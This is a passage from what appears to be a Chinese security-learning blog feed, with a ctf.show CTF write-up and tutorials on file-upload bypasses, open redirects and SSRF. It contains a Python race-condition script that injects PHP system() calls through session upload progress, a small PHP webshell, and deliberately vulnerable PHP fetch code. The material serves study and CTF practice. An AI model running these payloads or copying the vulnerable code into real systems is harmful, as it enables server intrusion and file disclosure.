之前上传时自拟的名字，对应图片内容中的sess_abc</span><br>url1 = <span class="hljs-string">&quot;http://58245caf-77db-4386-8f04-3a3536cfed7f.challenge.ctf.show&quot;</span>  <span class="hljs-comment"># 注意修改</span><br>url2 = <span class="hljs-string">&quot;http://58245caf-77db-4386-8f04-3a3536cfed7f.challenge.ctf.show/upload&quot;</span><br>data1 = &#123;<br>    <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span><br>&#125;<br>file = &#123;<br>    <span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">&#x27;abc&#x27;</span>  <span class="hljs-comment"># 文件名，随便改就行</span><br>&#125;<br>cookies = &#123;<br>    <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sess<br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>():  <span class="hljs-comment"># 上传文件竞争过程</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r = session.post(url1, data=data1, files=file, cookies=cookies)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># 每次竞争完都访问一下url/upload看有没有flag</span><br>        r = session.get(url2)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;ctfshow&#123;.+&#125;&#x27;</span>)  <span class="hljs-comment"># flag格式匹配</span><br>            <span class="hljs-built_in">print</span>(flag.findall(r.text))<br><br><br>threads = [threading.Thread(target=write),<br>           threading.Thread(target=read)]<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>    t.start()<br></code></pre></td></tr></table></figure><p>稍等片刻得到flag</p><p><img src="/../images/d6bc3eb2d69dbdebc785f2755e4b9a93.png" alt="d6bc3eb2d69dbdebc785f2755e4b9a93"></p><p>法二：</p><p>新建文件abc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat ../f*&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ip转数字：795762179</p><p>官网：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://www.bejson.com/convert/ip2int/<br></code></pre></td></tr></table></figure><p>先上传ini包含文件</p><p><img src="/../images/c56dd2fe-4e41-4b3c-a83a-eeb5425bcdd2.png" alt="c56dd2fe-4e41-4b3c-a83a-eeb5425bcdd2"></p><p>再上传远程调用文件 txt</p><p><img src="/../images/82338ce0-fff8-45b5-a0c9-5314553b8ce8.png" alt="82338ce0-fff8-45b5-a0c9-5314553b8ce8"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2025/05/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2025/05/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>1.只是前端校验，可通过在前端修改后缀</p><p>2.后端单一校验，可通过抓包改后缀不改文件类型</p><p><img src="/../images/9a762f47-2287-47f7-b391-096b379b28aa.png" alt="9a762f47-2287-47f7-b391-096b379b28aa"></p><p>若存在后端校验，同样上传jpg，只改前端无法绕过。</p><p><img src="/../images/eddc040ccdda087f6262057a63c5bdbe.png" alt="eddc040ccdda087f6262057a63c5bdbe"></p><p><img src="/../images/5a90eab4cca48291f96c1dfc3cab70f3.png" alt="5a90eab4cca48291f96c1dfc3cab70f3"></p><p>(不在同一目录下可用tac  ..&#x2F;flag.php)</p><p>3.mine检测，需要改content-type</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>)&#123;<br></code></pre></td></tr></table></figure><p>成功</p><p><img src="/../images/cf231c4e-e5be-46f2-9bd3-0532c3a4be09.png" alt="cf231c4e-e5be-46f2-9bd3-0532c3a4be09"></p><p>失败</p><p><img src="/../images/69e99a6f-e224-4357-9282-b2bec9b360b1.png" alt="69e99a6f-e224-4357-9282-b2bec9b360b1"></p>]]></content>
    
    
    <categories>
      
      <category>web漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>URL重定向与SSRF与CORS跨域</title>
    <link href="/2025/04/23/URL%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%8ESSRF%E4%B8%8ECORS%E8%B7%A8%E5%9F%9F/"/>
    <url>/2025/04/23/URL%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%8ESSRF%E4%B8%8ECORS%E8%B7%A8%E5%9F%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="URL重定向与SSRF"><a href="#URL重定向与SSRF" class="headerlink" title="URL重定向与SSRF"></a>URL重定向与SSRF</h1><p>URL重定向（URL Redirection）和服务器端请求伪造（Server-Side Request Forgery, SSRF）是两种截然不同的概念，它们在目的、执行者和安全影响上有着本质的区别。</p><h3 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a><strong>URL重定向</strong></h3><p>URL重定向是一种网站技术，指当用户访问某个网址时，自动将其导向另一个网址。 这种技术通常用于正当目的，例如：</p><ul><li><strong>网站迁移</strong>：将旧域名的流量引导至新域名。</li><li><strong>简化URL</strong>：将冗长复杂的网址转换为更短、更易于记忆的链接。</li><li><strong>站点维护</strong>：在网站维护期间临时将用户导向一个通知页面。</li></ul><p>在URL重定向中，请求的发起者是用户的<strong>浏览器（客户端）</strong>。服务器在收到初始请求后，会返回一个特殊的HTTP响应（如301永久重定向或302临时重定向），浏览器在解析这个响应后，会再发起一个新的请求到目标URL。</p><h3 id="服务器端请求伪造-SSRF"><a href="#服务器端请求伪造-SSRF" class="headerlink" title="服务器端请求伪造 (SSRF)"></a><strong>服务器端请求伪造 (SSRF)</strong></h3><p>服务器端请求伪造（SSRF）是一种网络安全漏洞，攻击者可以利用这个漏洞来滥用服务器功能，让服务器代替攻击者发起请求，从而访问或操作那些攻击者无法直接访问的内部系统或数据。</p><p>在SSRF攻击中，请求的发起者是<strong>存在漏洞的服务器</strong>。攻击者通过构造恶意的请求，诱使服务器向其指定的URL（通常是内部网络或本地回环地址）发送请求。</p><h3 id="主要区别"><a href="#主要区别" class="headerlink" title="主要区别"></a><strong>主要区别</strong></h3><table><thead><tr><th>特征</th><th>URL重定向</th><th>服务器端请求伪造 (SSRF)</th></tr></thead><tbody><tr><td><strong>发起者</strong></td><td>用户的浏览器（客户端）</td><td>Web应用程序所在的服务器（服务端）</td></tr><tr><td><strong>目的</strong></td><td>通常是合法的，用于网站管理和用户体验优化</td><td>恶意的，旨在攻击服务器及其内部网络</td></tr><tr><td><strong>控制方</strong></td><td>网站管理员设置重定向规则</td><td>攻击者利用漏洞构造并发送恶意请求</td></tr><tr><td><strong>影响</strong></td><td><strong>对用户的影响</strong>：用户被导向不同的网页。如果被恶意利用，可能导致钓鱼攻击。</td><td><strong>对服务器的影响</strong>：攻击者可以利用服务器作为代理，扫描内部网络、攻击内部服务、读取本地文件或窃取敏感数据，绕过防火墙等安全防护。</td></tr><tr><td><strong>本质</strong></td><td>一种<strong>网站功能</strong></td><td>一种<strong>安全漏洞</strong></td></tr></tbody></table><p>简而言之，<strong>URL重定向是让用户的浏览器去访问另一个地址，而SSRF是欺骗服务器去访问一个地址</strong>。前者是服务器指挥浏览器，后者是攻击者指挥服务器。这个根本性的差异导致了它们在应用场景和安全风险上的巨大不同。</p><h1 id="URL重定向与SSRF与CORS跨域"><a href="#URL重定向与SSRF与CORS跨域" class="headerlink" title="URL重定向与SSRF与CORS跨域"></a>URL重定向与SSRF与CORS跨域</h1><p>URL重定向（URL Redirection）、服务器端请求伪造（SSRF）和跨域资源共享（CORS）这三者之间的区别。</p><p>这三者涉及到网络请求和资源访问，但它们的机制、目的和安全关注点完全不同。</p><h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><ul><li><strong>URL重定向 (URL Redirection):</strong> 一种服务器或客户端行为，目的是将一个URL的访问请求自动导向另一个URL。</li><li><strong>服务器端请求伪造 (SSRF):</strong> 一种安全漏洞，攻击者利用该漏洞，诱使服务器代替攻击者发起请求到一个攻击者指定的地址。</li><li><strong>跨域资源共享 (CORS):</strong> 一种浏览器安全机制，用于允许或限制网页脚本从一个源（origin）向另一个源发起跨域HTTP请求。</li></ul><h3 id="主要区别对比表"><a href="#主要区别对比表" class="headerlink" title="主要区别对比表"></a>主要区别对比表</h3><p>为了更清晰地理解，我们可以从以下几个维度进行对比：</p><table><thead><tr><th>特征维度</th><th>URL重定向</th><th>服务器端请求伪造 (SSRF)</th><th>跨域资源共享 (CORS)</th></tr></thead><tbody><tr><td><strong>发起方</strong></td><td>用户的<strong>浏览器</strong>（在收到服务器的重定向指令后）</td><td>存在漏洞的<strong>Web服务器</strong>（受攻击者控制）</td><td>用户的<strong>浏览器</strong>（由网页中的脚本如JavaScript发起）</td></tr><tr><td><strong>请求方向</strong></td><td>浏览器 -&gt; 服务器A -&gt; (重定向指令) -&gt; 浏览器 -&gt; 服务器B</td><td>攻击者 -&gt; 服务器A -&gt; (伪造的请求) -&gt; 目标服务器B (通常是内部网络或本地)</td><td>浏览器 (运行着源A的脚本) -&gt; 目标服务器B</td></tr><tr><td><strong>本质与目的</strong></td><td>一种<strong>网站功能</strong>，用于网站导航、域名变更等。</td><td>一种<strong>安全漏洞</strong>，目的是利用服务器作为代理来攻击内部系统。</td><td>一种<strong>浏览器安全策略</strong>，目的是在受控的情况下允许跨源请求，以增强Web应用的灵活性。</td></tr><tr><td><strong>谁来控制</strong></td><td><strong>网站开发者&#x2F;管理员</strong>设置重定向规则。</td><td><strong>攻击者</strong>通过构造恶意输入来控制服务器发起的请求。</td><td>由<strong>目标服务器B</strong>通过设置特定的HTTP响应头（如 <code>Access-Control-Allow-Origin</code>）来决定是否允许来自<strong>源A</strong>的请求。</td></tr><tr><td><strong>安全关注点</strong></td><td><strong>开放重定向 (Open Redirect)</strong>：如果重定向的目标URL可被用户任意控制，攻击者可能利用它将用户重定向到恶意网站，进行钓鱼攻击。</td><td>攻击内部网络、端口扫描、读取本地敏感文件、执行远程命令等，是<strong>服务端</strong>的严重安全风险。</td><td>防止恶意网站脚本在用户不知情的情况下，读取或操作用户在其他网站上的敏感数据，是<strong>浏览器端</strong>为了保护用户数据而设定的安全机制。</td></tr></tbody></table><h3 id="场景类比"><a href="#场景类比" class="headerlink" title="场景类比"></a>场景类比</h3><p>为了帮助理解，我们可以做一个简单的比喻：</p><ul><li><strong>URL重定向</strong>：你（浏览器）去A公司找人，A公司的前台告诉你：“你要找的人已经搬到B公司了”，于是你自己（浏览器）跑到B公司去。 <strong>整个过程的主动权在你（浏览器）手上</strong>。</li><li><strong>SSRF</strong>：你（攻击者）打电话给A公司（存在漏洞的服务器），骗前台说：“麻烦你帮我给你们的CEO打个内部电话（内部网络），告诉他一件事”。A公司的前台（服务器）信以为真，就用内部电话帮你传话了。 <strong>你利用了A公司的身份和权限去办事</strong>。</li><li><strong>CORS</strong>：你（运行在浏览器上的A网站脚本）想直接从你的工位上拿一份B公司的内部文件（跨域请求资源）。B公司的安保系统（浏览器同源策略）拦住了你，说：“不行，不同公司的人不能随便拿东西”。但如果B公司（目标服务器）的门口贴了一张告示：“欢迎A公司的员工来取文件”（设置了CORS响应头），那么安保系统（浏览器）就会放行。 <strong>这是B公司决定是否给你权限</strong>。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>URL重定向</strong>和<strong>CORS</strong>的请求发起方都是<strong>浏览器</strong>，而<strong>SSRF</strong>的发起方是<strong>服务器</strong>。</li><li><strong>URL重定向</strong>是一种功能，<strong>SSRF</strong>是一种漏洞，<strong>CORS</strong>是一种安全机制。</li><li>它们解决的问题完全不同：URL重定向解决的是**“去哪里”<strong>的问题；SSRF利用的是</strong>“让服务器替我请求”<strong>的漏洞；CORS解决的是浏览器脚本</strong>“能不能跨域请求资源”**的权限问题。</li></ul>]]></content>
    
    
    <categories>
      
      <category>web漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>URL</title>
    <link href="/2025/04/22/URL%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    <url>/2025/04/22/URL%E9%87%8D%E5%AE%9A%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h3 id="URL重定向漏洞：一种看似无害的巨大风险"><a href="#URL重定向漏洞：一种看似无害的巨大风险" class="headerlink" title="URL重定向漏洞：一种看似无害的巨大风险"></a>URL重定向漏洞：一种看似无害的巨大风险</h3><p>URL重定向漏洞，也称为“开放重定向”（Open Redirect），是一种常见的Web应用程序安全漏洞。它的核心问题在于，<strong>Web应用程序接收并使用用户提供的不可信输入来构造重定向URL，但没有对这个输入进行充分的验证</strong>。</p><p>这使得攻击者可以制作一个看起来指向合法、可信网站的链接，但当用户点击时，会被悄无声息地重定向到一个由攻击者控制的恶意网站。</p><h4 id="漏洞是如何产生的？"><a href="#漏洞是如何产生的？" class="headerlink" title="漏洞是如何产生的？"></a>漏洞是如何产生的？</h4><p>许多网站为了方便用户，都提供了URL跳转功能。一个典型的例子是登录成功后的跳转。例如，一个网站的登录链接可能是这样的：</p><p><code>https://www.example.com/login?redirect_url=/user/dashboard</code></p><p>当用户输入正确的用户名和密码后，网站服务器会读取 <code>redirect_url</code> 参数的值（这里是 <code>/user/dashboard</code>），然后将用户浏览器重定向到这个指定的页面。</p><p>如果网站开发者没有对 <code>redirect_url</code> 参数进行严格的检查，攻击者就可以构造一个恶意的链接：</p><p><code>https://www.example.com/login?redirect_url=https://www.evil-site.com</code></p><p><strong>攻击流程如下：</strong></p><ol><li><strong>构造恶意链接</strong>：攻击者将 <code>redirect_url</code> 参数替换为指向恶意网站的地址。</li><li><strong>伪装与诱导</strong>：攻击者通过电子邮件、社交媒体等方式，将这个精心构造的链接发送给受害者。由于链接的域名部分 <code>www.example.com</code> 是用户信任的合法网站，用户很可能会放松警惕并点击链接。</li><li><strong>重定向至恶意网站</strong>：用户点击链接后，会首先访问合法的 <code>example.com</code>。网站服务器在处理请求时，未经校验就直接读取了 <code>redirect_url</code> 参数，并向用户的浏览器发送一个重定向指令，将其导向 <code>https://www.evil-site.com</code>。</li><li><strong>实施攻击</strong>：一旦用户被重定向到恶意网站，攻击者就可以实施各种网络攻击。</li></ol><h4 id="URL重定向漏洞的主要危害"><a href="#URL重定向漏洞的主要危害" class="headerlink" title="URL重定向漏洞的主要危害"></a>URL重定向漏洞的主要危害</h4><p>尽管URL重定向本身不直接窃取数据或执行代码，但它却是许多其他严重攻击的“跳板”，其主要危害包括：</p><ol><li><p><strong>网络钓鱼（Phishing）</strong>：这是最常见的利用方式。攻击者可以将用户重定向到一个与原网站界面一模一样的假冒网站，诱骗用户输入用户名、密码、银行卡号、信用卡信息等敏感凭证。</p></li><li><p><strong>传播恶意软件</strong>：攻击者可以将用户重定向到一个包含恶意脚本或提供恶意软件下载的网站。用户可能会在不知不觉中下载并安装病毒、木马或勒索软件。</p></li><li><p><strong>绕过安全过滤和信任机制</strong>：由于初始链接来自受信任的域名，它可以绕过一些基于域名的垃圾邮件过滤器或用户的警惕心理。</p></li><li><p><strong>结合其他漏洞发起攻击</strong>：URL重定向可以与其他漏洞（如跨站脚本XSS）结合，例如，将用户重定向到一个包含<code>data:</code>或<code>javascript:</code>协议的URL，可能直接在用户的浏览器中执行恶意脚本。</p></li></ol><h4 id="如何识别和防范URL重定向漏洞？"><a href="#如何识别和防范URL重定向漏洞？" class="headerlink" title="如何识别和防范URL重定向漏洞？"></a>如何识别和防范URL重定向漏洞？</h4><p>对于普通用户和网站开发者来说，可以采取以下措施：</p><p><strong>面向开发者&#x2F;网站管理员：</strong></p><ul><li><strong>避免使用重定向</strong>：如果非必要，尽量不要让应用程序根据用户的输入进行重定向。</li><li><strong>使用白名单验证</strong>：这是最有效的防御方法。创建一个包含所有允许跳转的安全URL列表。在执行重定向之前，严格检查 <code>redirect_url</code> 参数的值是否在该白名单内。如果不在，则拒绝跳转或跳转到一个默认的安全页面。</li><li><strong>对参数进行严格校验</strong>：如果无法使用白名单，应对跳转参数进行严格的格式和内容校验，例如，只允许跳转到本站的相对路径（如 <code>/user/dashboard</code>），并严格过滤掉 <code>http://</code>, <code>https://</code>, <code>//</code> 等可能指向外部站点的字符串。</li><li><strong>生成跳转确认页面</strong>：在执行重定向前，向用户显示一个提示页面，明确告知用户“您即将离开本站，前往[目标URL]，请确认风险”，由用户手动确认后才进行跳转。</li></ul><p><strong>面向普通用户：</strong></p><ul><li><strong>保持警惕</strong>：在点击任何链接之前，尤其是在邮件和即时消息中，要仔细检查链接的完整性。</li><li><strong>查看浏览器地址栏</strong>：在输入任何敏感信息之前，务必确认浏览器地址栏中的域名是否是您期望访问的官方网站。</li><li><strong>使用安全工具</strong>：安装可靠的安全软件和浏览器插件，它们可以帮助识别和阻止已知的恶意网站。</li></ul><p>总之，URL重定向漏洞利用了用户对知名网站的信任，是一个隐蔽但危险的攻击入口。通过开发者侧严格的安全控制和用户侧谨慎的使用习惯，可以有效规避其带来的风险。</p>]]></content>
    
    
    <categories>
      
      <category>web漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2025/04/19/SSRF/"/>
    <url>/2025/04/19/SSRF/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/SSRF3.png"></p><h2 id="SSRF-简介"><a href="#SSRF-简介" class="headerlink" title="SSRF 简介"></a>SSRF 简介</h2><p>SSRF，Server-Side Request Forgery，<strong>服务端请求伪造</strong>，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p><p>漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><p>攻击者可以利用 SSRF 实现的攻击主要有 5 种：</p><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li><li>攻击运行在内网或本地的应用程序（比如溢出）</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</li><li>利用 <code>file</code> 协议读取本地文件等</li></ol><p><img src="/images/SSRF1.jpg"></p><h2 id="SSRF-漏洞出现的场景"><a href="#SSRF-漏洞出现的场景" class="headerlink" title="SSRF 漏洞出现的场景"></a>SSRF 漏洞出现的场景</h2><ul><li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li><li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li><li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li><li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li><li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li></ul><h2 id="SSRF漏洞的检测方法"><a href="#SSRF漏洞的检测方法" class="headerlink" title="SSRF漏洞的检测方法"></a>SSRF漏洞的检测方法</h2><ul><li>抓包分析发送的请求是否是由服务器发送的</li><li>从页面源码中查找访问的资源地址</li></ul><h2 id="常用的后端实现"><a href="#常用的后端实现" class="headerlink" title="常用的后端实现"></a>常用的后端实现</h2><p><img src="/images/SSRF2.png"></p><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]); <br>    <span class="hljs-variable">$filename</span> =<span class="hljs-string">&#x27;./images/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;;img1.jpg&#x27;</span>; <br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]; <br>    <span class="hljs-variable">$img</span> = <span class="hljs-string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot;\&quot;/&gt;&quot;</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$img</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码使用 <code>file_get_contents</code> 函数从用户指定的 URL 获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。</p><h4 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>); <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码使用 <code>fsockopen</code> 函数实现获取用户指定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。</p><h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>);<br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用 <code>curl</code> 获取数据。</p><h2 id="阻碍-SSRF-漏洞利用的场景"><a href="#阻碍-SSRF-漏洞利用的场景" class="headerlink" title="阻碍 SSRF 漏洞利用的场景"></a>阻碍 SSRF 漏洞利用的场景</h2><ul><li>服务器开启 OpenSSL 无法进行交互利用</li><li>服务端需要鉴权（Cookies &amp; User：Pass）不能完美利用</li><li>限制请求的端口为 http 常用的端口，比如，80,443,8080,8090。</li><li>禁用不需要的协议。仅仅允许 http 和 https 请求。可以防止类似于 file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li></ul><h2 id="利用-SSRF-进行端口扫描"><a href="#利用-SSRF-进行端口扫描" class="headerlink" title="利用 SSRF 进行端口扫描"></a>利用 SSRF 进行端口扫描</h2><p>根据服务器的返回信息进行判断，大部分应用不会判别端口，可通过返回的 banner 信息判断端口状态。</p><p>后端实现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;txt&#x27;</span>;<br>    <span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$link</span>);<br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;w&quot;</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_FILE, <span class="hljs-variable">$fp</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title 